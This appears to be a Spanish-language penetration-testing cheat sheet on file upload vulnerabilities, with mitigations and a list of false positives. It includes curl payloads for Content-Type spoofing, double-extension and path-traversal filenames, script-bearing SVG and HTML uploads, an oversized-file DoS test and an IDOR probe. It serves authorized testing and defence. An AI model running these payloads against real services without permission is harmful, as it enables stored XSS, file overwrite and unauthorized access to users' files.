# File Upload

> Técnica: revisar validación, almacenamiento, procesamiento y acceso a ficheros subidos.

## Cuándo probar

- Hay subida de avatar, documentos, justificantes, CSV, PDF, imágenes o adjuntos.
- El fichero se procesa después de subirlo.
- El fichero queda accesible por URL.
- Se aceptan distintos formatos.
- Hay previsualización, conversión o extracción de metadatos.

## Variables

```bash
export BASE_URL="https://example.com"
export TOKEN="eyJhbGciOi..."
```

## Baseline

```bash
curl -i -X POST "$BASE_URL/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.png"
```

## Pruebas rápidas

### Cambiar Content-Type

```bash
curl -i -X POST "$BASE_URL/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.txt;type=image/png"
```

### Doble extensión

```bash
cp test.txt test.php.png

curl -i -X POST "$BASE_URL/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.php.png"
```

### Nombre con path traversal

```bash
curl -i -X POST "$BASE_URL/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.txt;filename=../../test.txt"
```

### SVG con contenido activo

```bash
cat > test.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
EOF

curl -i -X POST "$BASE_URL/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.svg;type=image/svg+xml"
```

### HTML renombrado

```bash
cat > test.html << 'EOF'
<h1>test</h1><script>alert(1)</script>
EOF

cp test.html test.jpg

curl -i -X POST "$BASE_URL/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.jpg;type=image/jpeg"
```

### Fichero grande

```bash
dd if=/dev/zero of=large.bin bs=1M count=25

curl -i -X POST "$BASE_URL/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@large.bin"
```

## Qué buscar

| Señal | Riesgo |
|---|---|
| Valida solo extensión | Bypass por Content-Type o magic bytes |
| Permite SVG | XSS si se sirve inline |
| Sirve con `text/html` | Ejecución en navegador |
| Guarda nombre original | Path traversal, overwrite, info leak |
| URL predecible | Acceso a ficheros de otros usuarios |
| No limita tamaño | DoS / consumo de almacenamiento |
| Procesa PDF/Office | Riesgo por parsers o metadatos |
| Fichero público sin auth | Information disclosure |

## Comprobar acceso al fichero

Si la API devuelve una URL:

```bash
export FILE_URL="https://example.com/uploads/test.svg"

curl -i "$FILE_URL"
```

Revisar headers:

```bash
curl -I "$FILE_URL"
```

Cabeceras importantes:

```text
Content-Type
Content-Disposition
X-Content-Type-Options
Cache-Control
```

## IDOR en ficheros

```bash
curl -i "$BASE_URL/api/files/VICTIM_FILE_ID" \
  -H "Authorization: Bearer $TOKEN"
```

## Evidencia mínima

```text
Endpoint de subida:
Usuario:
Fichero original:
Nombre enviado:
Content-Type enviado:
Response:
URL resultante:
Headers de descarga:
Impacto:
```

## Falsos positivos

- El fichero se sube pero nunca se sirve.
- El contenido activo se descarga como attachment.
- El fichero queda aislado en storage privado.
- La URL requiere autorización correcta.
- El procesamiento elimina contenido peligroso.

## Mitigación

- Validar extensión, MIME y magic bytes.
- Renombrar ficheros en servidor.
- Servir como attachment si no debe renderizarse.
- Usar `X-Content-Type-Options: nosniff`.
- Almacenar fuera del webroot.
- Aplicar autorización en descarga.
- Limitar tamaño y tipo.
- Eliminar metadatos si aplica.